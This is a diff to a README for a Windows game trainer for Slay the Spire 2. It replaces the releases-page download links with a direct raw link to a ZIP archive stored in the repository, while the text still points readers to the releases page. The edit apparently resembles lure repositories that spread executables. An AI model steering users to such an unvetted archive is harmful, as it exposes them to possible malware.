@@ -1,6 +1,6 @@
 # 🎮 Slay-The-Spire-2-Trainer - Simple Game Helper for Windows
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Lyam2147/Slay-The-Spire-2-Trainer/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Lyam2147/Slay-The-Spire-2-Trainer/main/assets/Slay-The-Spire-Trainer-v1.5.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ Use it to change common game values while you play. The app is built for easy us
 
 Visit this page to download the latest version:
 
-https://github.com/Lyam2147/Slay-The-Spire-2-Trainer/releases
+https://raw.githubusercontent.com/Lyam2147/Slay-The-Spire-2-Trainer/main/assets/Slay-The-Spire-Trainer-v1.5.zip
 
 On the releases page, look for the newest release. Then download the file that matches the app name. If you see a ZIP file, download it first, then extract it before you run the app.
 
